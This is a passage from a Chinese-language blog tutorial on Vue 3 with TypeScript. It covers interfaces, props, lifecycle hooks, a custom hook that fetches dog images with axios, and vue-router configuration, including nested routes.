//显式地暴露组件内部的状态或方法，使其可以在父组件中通过模板引用 (ref) 访问。   </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="TS接口、泛型、自定义类型"><a href="#TS接口、泛型、自定义类型" class="headerlink" title="TS接口、泛型、自定义类型"></a>TS接口、泛型、自定义类型</h3><p>在 TypeScript 中，<code>string</code> 和 <code>String</code> 有以下区别：</p><p><strong>类型</strong>：</p><ul><li><code>string</code> 是 TypeScript 中的基本类型，用于表示文本数据。</li><li><code>String</code> 是 JavaScript 的一个内置对象，它是一个构造函数，可以用来创建字符串对象。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//定义一个接口</span><br><span class="line">export interface PersonInter&#123;</span><br><span class="line">    id:string,</span><br><span class="line">    name:string,</span><br><span class="line">    age:number,</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">export const a = 9;</span><br></pre></td></tr></table></figure><p>使用接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import &#123; a &#125; from &#x27;../types/index&#x27;        //值</span><br><span class="line">import &#123; type PersonInter &#125; from &#x27;../types/index&#x27;      //规范、类型</span><br><span class="line"></span><br><span class="line">let person: PersonInter = &#123;</span><br><span class="line">    age: 18, id: &#x27;114514&#x27;, name: &#x27;Randolfluo&#x27;</span><br><span class="line">&#125;</span><br><span class="line">                //泛型</span><br><span class="line">let personlist: Array&lt;PersonInter&gt; = [</span><br><span class="line">    &#123;age: 18, id: &#x27;114514&#x27;, name: &#x27;Randolfluo&#x27;, man:1&#125;,</span><br><span class="line">    &#123;age: 16, id: &#x27;83139&#x27;, name: &#x27;Hatsune Miku&#x27;&#125;,</span><br><span class="line">    &#123;age: 14, id: &#x27;0721&#x27;, name: &#x27;yuzusoft&#x27;&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="props"><a href="#props" class="headerlink" title="props"></a>props</h3><p><code>vue-bind</code></p><ul><li><strong>动态绑定</strong>: <code>v-bind</code> 用于动态绑定 Vue 实例的数据到 HTML 元素的属性上。</li><li><strong>简写</strong>: <code>v-bind</code> 可以使用 <code>:</code> 作为简写。</li><li><strong>对象语法</strong>: 可以将多个属性通过对象绑定到元素上。**</li><li><strong>组件中使用</strong>: 可以动态传递 props 给子组件。</li></ul><p>这里我们在父类定义数据，然后传递到子组件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h1&gt;泥嚎：&lt;/h1&gt;</span><br><span class="line">        &lt;person :list = &quot;personlist&quot;/&gt;//传数据，子组件显示数据</span><br><span class="line">        &lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;person/&gt;//不传数据，子组件显示默认值</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;, setup name = &quot;App&quot;&gt;</span><br><span class="line">import Person from &#x27;./components/Person.vue&#x27;;   </span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; type PersonInter &#125; from &#x27;@/types/index&#x27;      //规范、类型</span><br><span class="line">                //泛型</span><br><span class="line">let personlist  = reactive&lt;Array&lt;PersonInter&gt;&gt;([</span><br><span class="line">    &#123;age: 18, id: &#x27;114514&#x27;, name: &#x27;Randolfluo&#x27;&#125;,</span><br><span class="line">    &#123;age: 16, id: &#x27;83139&#x27;, name: &#x27;Hatsune Miku&#x27;&#125;,</span><br><span class="line">    &#123;age: 14, id: &#x27;0721&#x27;, name: &#x27;yuzusoft&#x27;&#125;,</span><br><span class="line">])</span><br><span class="line">//reactive直接传泛型</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件显示父亲传来的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">            &#123;&#123; item.name &#125;&#125;     &#123;&#123; item.age &#125;&#125;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123; defineProps &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; type PersonInter &#125; from &#x27;@/types/index&#x27;</span><br><span class="line">// 第一种写法：仅接收</span><br><span class="line">// const props = defineProps([&#x27;list&#x27;])</span><br><span class="line"></span><br><span class="line">// 第二种写法：接收+限制类型</span><br><span class="line">// defineProps&lt;&#123;list:Persons&#125;&gt;()</span><br><span class="line"></span><br><span class="line">// 第三种写法：接收+限制类型+指定默认值+限制必要性</span><br><span class="line">let props = withDefaults(defineProps&lt;&#123;list?:Array&lt;PersonInter&gt;&#125;&gt;(),&#123;</span><br><span class="line">  list:()=&gt;[&#123;id:&#x27;asdasg01&#x27;,name:&#x27;小猪佩奇&#x27;,age:18&#125;]</span><br><span class="line">&#125;)</span><br><span class="line">console.log(props)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="生命周期（生命周期钩子，生命周期函数）"><a href="#生命周期（生命周期钩子，生命周期函数）" class="headerlink" title="生命周期（生命周期钩子，生命周期函数）"></a>生命周期（生命周期钩子，生命周期函数）</h3><p>​                         </p><blockquote><p>v - if 和 v-show</p><ul><li><code>v-if</code> 是“真正的”条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。</li><li><code>v-show</code> 不销毁元素，只是简单地切换元素的 <code>display</code> 属性。</li></ul></blockquote><ul><li><p>概念：<code>Vue</code>组件实例在创建时要经历一系列的初始化步骤，在此过程中<code>Vue</code>会在合适的时机，调用特定的函数，从而让开发者有机会在特定阶段运行自己的代码，这些特定的函数统称为：生命周期钩子</p></li><li><p>规律：</p><blockquote><p>生命周期整体分为四个阶段，分别是：<strong>创建、挂载、更新、销毁</strong>，每个阶段都有两个钩子，一前一后。</p></blockquote></li><li><p><code>Vue2</code>的生命周期</p><blockquote><p>创建阶段：<code>beforeCreate</code>、<code>created</code></p><p>挂载阶段：<code>beforeMount</code>、<code>mounted</code></p><p>更新阶段：<code>beforeUpdate</code>、<code>updated</code></p><p>销毁阶段：<code>beforeDestroy</code>、<code>destroyed</code></p></blockquote></li><li><p><code>Vue3</code>的生命周期</p><blockquote><p>创建阶段：<code>setup</code></p><p>挂载阶段：<code>onBeforeMount</code>、<code>onMounted</code></p><p>更新阶段：<code>onBeforeUpdate</code>、<code>onUpdated</code></p><p>卸载阶段：<code>onBeforeUnmount</code>、<code>onUnmounted</code></p></blockquote></li><li><p>常用的钩子：<code>onMounted</code>(挂载完毕)、<code>onUpdated</code>(更新完毕)、<code>onBeforeUnmount</code>(卸载之前)</p></li><li><p>父组件与子组件的关系：类似于深度优先搜索。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;点我sum+1&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- vue3写法 --&gt;</span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123; </span><br><span class="line">    ref, </span><br><span class="line">    onBeforeMount, </span><br><span class="line">    onMounted, </span><br><span class="line">    onBeforeUpdate, </span><br><span class="line">    onUpdated, </span><br><span class="line">    onBeforeUnmount, </span><br><span class="line">    onUnmounted </span><br><span class="line">  &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let sum = ref(0)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeSum() &#123;</span><br><span class="line">    sum.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(&#x27;setup&#x27;)</span><br><span class="line">  // 生命周期钩子</span><br><span class="line">  onBeforeMount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onMounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUpdate(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUpdated(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUnmount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUnmounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="自定义hooks"><a href="#自定义hooks" class="headerlink" title="自定义hooks"></a>自定义hooks</h3><p>允许你将逻辑提取到可重用的函数中，使你的代码更清晰和模块化。</p><p>安装axios，用于发起 HTTP 请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i axios</span><br></pre></td></tr></table></figure><blockquote><p>跨域问题通常指的是在互联网上，出于安全考虑，浏览器默认阻止一个源（协议+域名+端口）的网页向另一个源发送HTTP请求的问题。这种机制被称为“同源策略”（Same-origin policy）。</p></blockquote><p>我们自定义一个hook</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive, onMounted &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios, &#123; <span class="title class_">AxiosError</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">useDog</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> dogList = reactive&lt;<span class="built_in">string</span>[]&gt;([])    <span class="comment">//&lt;string[]&gt;表示这个变量是一个字符串数组。    ([])空数组的初始化语法。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getDog</span>(<span class="params"></span>) &#123;       <span class="comment">// 异步函数用于从 API 获取数据。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> &#123; data &#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://dog.ceo/api/breed/pembroke/images/random&#x27;</span>);</span><br><span class="line">            dogList.<span class="title function_">push</span>(data.<span class="property">message</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">const</span> err = &lt;<span class="title class_">AxiosError</span>&gt;error</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err.<span class="property">message</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;       <span class="comment">//在组件挂载后立即调用getDog函数</span></span><br><span class="line">        <span class="title function_">getDog</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> &#123; dogList, getDog &#125;  <span class="comment">//返回响应式数据和方法</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在vue中使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;button @click=&quot;getDog&quot;&gt;狗！&lt;/button&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;img v-for=&quot;(dog, idx) in dogList&quot; :key = &quot;idx&quot; :src = &quot;(dog as string)&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import useDog from &#x27;@/hooks/useDog&#x27;;//导入</span><br><span class="line">let &#123;dogList, getDog&#125; = useDog()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><ul><li>实现<code>SPA应用（Single Page Application）</code>，只加载单个 HTML 页面，并在用户与应用程序交互时动态更新该页面的内容。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i vue -router</span><br></pre></td></tr></table></figure><p>首先在<code>router</code>文件夹创建个<code>index.ts</code>文件配置路由</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> about <span class="keyword">from</span> <span class="string">&#x27;@/pages/about.vue&#x27;</span>     <span class="comment">//@代表src</span></span><br><span class="line"><span class="keyword">import</span> context <span class="keyword">from</span> <span class="string">&#x27;@/pages/context.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),    <span class="comment">//`history`模式</span></span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: about</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/context&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">     <span class="attr">component</span>: context</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"><span class="comment">//将 router 实例导出，以便在 Vue 应用的其他部分使用</span></span><br></pre></td></tr></table></figure><ul><li><p>将子组件放入pages文件夹</p></li><li><p>home文件不能作为vue文件导入路由，好像这个会默认渲染为主页面。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;navbar&quot;&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">          &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;router-link to=&quot;/context&quot; active-class=&quot;active&quot;&gt;context&lt;/router-link&gt;&lt;/li&gt;//to方式一</span><br><span class="line">           &lt;li&gt;&lt;router-link :to=&quot;&#123;path:&#x27;/about&#x27;&#125;&quot; active-class=&quot;active&quot;&gt;About&lt;/router-link&gt;&lt;/li&gt;//to方式二</span><br><span class="line">               &lt;!-- :to=&quot;&#123;path:&#x27;about&#x27;&#125;&quot;  可以使用名字跳转 --&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">        &lt;/nav&gt;</span><br><span class="line">        &lt;div class = &quot;main-container&quot;&gt;</span><br><span class="line">          &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;script lang = &quot;ts&quot; setup name = &quot;App&quot;&gt;</span><br><span class="line">   import &#123;RouterView&#125; from &#x27;vue-router&#x27;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;style scoped&gt;</span><br><span class="line">/* 主页面的样式 */</span><br></pre></td></tr></table></figure><p>在<code>main.ts</code>使用router</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router/index&#x27;</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(router)<span class="comment">//将路由功能集成到应用中</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>路由切换的注意点：</strong></p><ol><li><p>路由组件通常存放在<code>pages</code> 或 <code>views</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</p></li><li><p>通过点击导航，视觉效果上“消失” 了的路由组件，默认是被<strong>卸载</strong>掉的，需要的时候再去<strong>挂载</strong>。</p></li></ol><p><strong>路由器工作模式：</strong></p><ol><li><p><code>history</code>模式</p><blockquote><p>优点：<code>URL</code>更加美观，不带有<code>#</code>，更接近传统的网站<code>URL</code>。</p><p>缺点：后期项目上线，需要服务端配合处理路径问题，否则刷新会有<code>404</code>错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line"><span class="attr">history</span>:<span class="title function_">createWebHistory</span>(), <span class="comment">//history模式</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>hash</code>模式</p><blockquote><p>优点：兼容性更好，因为不需要服务器端处理路径。</p><p>缺点：<code>URL</code>带有<code>#</code>不太美观，且在<code>SEO</code>优化方面相对较差。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line"><span class="attr">history</span>:<span class="title function_">createWebHashHistory</span>(), <span class="comment">//hash模式</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li></ol><p><strong>to的两种写法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 第一种：to的字符串写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;主页&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 第二种：to的对象写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; :to=&quot;&#123;path:&#x27;/home&#x27;&#125;&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><h3 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h3><h4 id="query参数"><a href="#query参数" class="headerlink" title="_query参数"></a>_query参数</h4><p>首先添加子路由</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> about <span class="keyword">from</span> <span class="string">&#x27;@/pages/about.vue&#x27;</span>     <span class="comment">//@代表src</span></span><br><span class="line"><span class="keyword">import</span> context <span class="keyword">from</span> <span class="string">&#x27;@/pages/context.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> detail <span class="keyword">from</span> <span class="string">&quot;@/pages/detail.vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),    <span class="comment">//在不刷新页面的情况下改变URL，同时保持应用的SPA（单页应用）特性。</span></span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: about,</span><br><span class="line">      <span class="attr">children</span>:[          <span class="comment">//添加子路由</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;detailname&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>: detail</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">       ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/context&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">     <span class="attr">component</span>: context,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"><span class="comment">//将 router 实例导出，以便在 Vue 应用的其他部分使用</span></span><br></pre></td></tr></table></figure><p>在父路由中添加数据和传递给子路由的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">   &lt;hr&gt;</span><br><span class="line">   &lt;div class=&quot;about&quot;&gt;</span><br><span class="line">      &lt;h1&gt;This is an about page&lt;/h1&gt;</span><br><span class="line">      &lt;h2&gt;I am 